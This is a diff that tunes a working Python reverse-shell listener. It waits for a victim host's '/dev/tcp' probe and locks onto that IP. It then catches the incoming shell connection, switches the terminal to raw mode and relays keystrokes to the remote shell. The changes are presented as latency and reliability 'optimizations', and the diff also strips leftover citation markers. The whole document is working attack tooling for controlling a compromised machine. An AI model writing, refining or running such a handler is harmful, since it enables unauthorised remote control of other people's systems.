@@ -9,12 +9,12 @@ import select
 import struct
 import fcntl
 
-# Configuration: Default port 4644, 20s initial timeout [cite: 1]
+# Configuration: Default port 4644, 40s initial timeout
 PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4644
 TIMEOUT = 40 
 
 def get_term_size():
-    """Returns (rows, cols) of the current terminal[cite: 1]."""
+    """Returns (rows, cols) of the current terminal."""
     s = struct.pack("HHHH", 0, 0, 0, 0)
     res = fcntl.ioctl(sys.stdout.fileno(), termios.TIOCGWINSZ, s)
     rows, cols, x, y = struct.unpack("HHHH", res)
@@ -25,10 +25,18 @@ def main():
     old_settings = termios.tcgetattr(fd)
     
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    # OPTIMIZATION: Disable Nagle's algorithm for lower latency in interactive sessions
+    server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+    # OPTIMIZATION: Reuse address to allow immediate restarts
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
     server.settimeout(TIMEOUT)
     server.bind(('0.0.0.0', PORT))
-    server.listen(1)
+    
+    # OPTIMIZATION: High backlog allows the kernel to ACK the probe instantly 
+    # even before the Python script calls accept().
+    server.listen(128)
 
     shell_conn = None
 
@@ -37,29 +45,31 @@ def main():
         
         # 1. CATCH THE PROBE (The 'true > /dev/tcp' check)
         probe_conn, addr = server.accept()
-        authorized_ip = addr[0]  # Lock onto the IP that probed us 
-        print(f"[*] Connection 1 (Probe) from {authorized_ip}.")
+        authorized_ip = addr[0]  # Lock onto the IP that probed us
+        
+        # OPTIMIZATION: Close immediately to satisfy the remote 0.1s timeout
         probe_conn.close() 
+        print(f"[*] Connection 1 (Probe) acknowledged from {authorized_ip}.")
 
         # 2. WAIT FOR THE SHELL (After the 2.5s delay) 
         server.settimeout(10)
         while True:
             shell_conn, addr = server.accept() 
             if addr[0] == authorized_ip:
-                # Verified: This matches the source of the probe 
+                # Verified: This matches the source of the probe
                 break 
             else:
-                # Ignore random network noise or other scanners 
+                # Ignore random network noise or other scanners
                 print(f"[*] Ignoring unauthorized connection from {addr[0]}")
                 shell_conn.close()
 
-        # Get and display the window size 
+        # Get and display the window size
         rows, cols = get_term_size()
         print(f"[*] Shell established from {authorized_ip}")
         print(f"[*] Window size: {rows} rows, {cols} cols.")
         print(f"[*] Tip: Run 'stty rows {rows} cols {cols}' inside the shell.")
 
-        # 3. ENTER RAW MODE 
+        # 3. ENTER RAW MODE
         tty.setraw(fd)
         
         # 4. DATA BRIDGE (Multiplexing Keyboard and Socket) 
@@ -67,12 +77,13 @@ def main():
             r, w, e = select.select([shell_conn, sys.stdin], [], [])
             
             if shell_conn in r:
-                data = shell_conn.recv(4096)
-                if not data: break 
+                # OPTIMIZATION: Increased buffer for high-speed terminal output
+                data = shell_conn.recv(8192)
+                if not data: break #
                 os.write(sys.stdout.fileno(), data)
             
             if sys.stdin in r:
-                data = os.read(fd, 4096)
+                data = os.read(fd, 8192)
                 if not data: break
                 shell_conn.sendall(data)
 
@@ -80,8 +91,10 @@ def main():
         print("\n[!] Timeout reached: No response.")
     except KeyboardInterrupt:
         print("\n[!] Stopped by user.")
+    except Exception as e:
+        print(f"\n[!] Error: {e}")
     finally:
-        # Restore terminal to original "cooked" state 
+        # Restore terminal to original "cooked" state
         termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
         if shell_conn: 
             shell_conn.close()
